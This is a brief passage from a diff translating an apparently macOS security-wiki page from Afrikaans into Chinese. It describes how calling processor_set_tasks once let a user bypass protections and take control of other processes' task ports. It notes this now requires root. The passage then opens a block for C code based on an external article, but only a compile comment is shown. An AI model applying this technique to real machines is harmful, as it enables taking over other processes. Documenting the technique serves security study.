+正如在 [**这篇文章**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/) 中提到的，过去这允许绕过之前提到的保护，以获取其他进程中的任务端口并通过调用 **`processor_set_tasks`** 来控制它们，并在每个进程上获取主机端口。\
+如今，您需要 root 才能使用该功能，并且这受到保护，因此您只能在未受保护的进程上获取这些端口。
 
-Jy kan dit probeer met:
+您可以尝试以下代码：
 
 <details>
 
-<summary><strong>processor_set_tasks kode</strong></summary>
+<summary><strong>processor_set_tasks 代码</strong></summary>
 ````c
 // Maincpart fo the code from https://newosxbook.com/articles/PST2.html
 //gcc ./port_pid.c -o port_pid
